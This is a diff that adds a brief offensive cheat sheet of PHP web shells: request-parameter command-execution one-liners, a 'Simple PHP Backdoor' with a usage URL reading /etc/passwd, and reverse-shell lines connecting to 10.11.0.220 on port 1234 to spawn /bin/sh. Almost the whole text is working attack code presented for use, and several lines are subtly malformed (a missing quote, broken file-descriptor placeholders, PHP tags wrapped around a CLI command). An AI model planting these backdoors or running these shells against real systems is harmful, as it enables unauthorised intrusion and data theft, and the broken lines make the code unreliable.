@@ -1,0 +1,25 @@
+PHP-SHELLS
+Try this first
+
+<?php echo exec($_REQUEST['c']);?>
+
+Try this next if the first doesn't work
+
+<?php echo exec($_GET['c']); ?>
+
+<?php -r '$sock=fsockopen(10.11.0.220",1234);exec("/bin/sh -i <&d >&%d 2>&%d",f,f,f)' ?>
+
+
+Simple PHP Backdoor By DK (One-Liner Version)     
+
+Usage: 
+
+http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd 
+
+ <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+
+php -r '$sock=fsockopen(10.11.0.220",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+
